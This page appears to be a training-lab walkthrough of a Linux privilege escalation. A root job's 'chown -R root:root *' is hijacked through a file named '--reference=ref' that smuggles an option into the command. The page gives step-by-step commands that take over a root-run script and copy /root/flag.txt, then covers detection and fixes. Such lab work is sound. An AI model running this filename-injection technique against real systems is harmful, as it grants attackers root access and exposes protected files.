# C06 · Station C — chown --reference · ★★★☆

> **Chapter:** [[Chapter-06-Overview]] · **Next:** [[C06-Station-D-chmod-reference]]
> **Host:** `hollow-archive-01` (`target-wild`) · **Job:** `chown -R root:root * ; bash process.sh` in `/opt/pipeline` (sticky `1777`)
> **The bug:** `--reference=FILE` makes `chown` copy FILE's owner, overriding `root:root`.

---

## 1. Exploit — do this first

```bash
cd /opt/pipeline
touch ref                        # a file you own
touch -- "--reference=ref"       # the injected option
# tick 1: chown flips process.sh to you (watch: stat -c %U process.sh)
echo 'cp /root/flag.txt /tmp/flag; chmod 644 /tmp/flag' > /opt/pipeline/process.sh
# tick 2: the job runs YOUR process.sh as root
cat /tmp/flag
```

---

## 2. How you find it

```bash
cat /usr/local/sbin/pipeline-run.sh   # chown -R root:root * ; bash process.sh
ls -ld /opt/pipeline                  # drwxrwxrwt — sticky: can't edit root's file
ls -l /opt/pipeline/process.sh        # root:root 0755
```

## 3. Why it works

The sticky bit stops you deleting or editing `process.sh` directly — that's why
you need the wildcard. `--reference=ref` overrides the explicit `root:root`, and
because `ref` is yours, `chown` makes `process.sh` yours too. Once you own it,
you overwrite it; the next tick runs your content as root. A two-step: **flip
ownership**, then **rewrite and wait**.

## 4. Pitfalls

- **`ref` must be a relative name in the dir** — filenames can't contain `/`, so `--reference=ref`, not `--reference=/path/ref`.
- It takes two ticks: own it first, then edit, then wait again.

## 5. Detect & fix

- **Detect:** `find / -name '--reference=*'`; a root script suddenly `! -user root`.
- **Fix:** `chown -R root:root ./*`; keep root scripts out of sticky/world-writable dirs. [[Blue-Team-Playbook]].

## 6. What you learned

- `chown`/`chmod` wildcards give a file primitive you convert to RCE; the sticky bit is why the wildcard is needed.

> Next: [[C06-Station-D-chmod-reference]] · Related: [[C02-Station-C-Writable-Drop-Dir]]
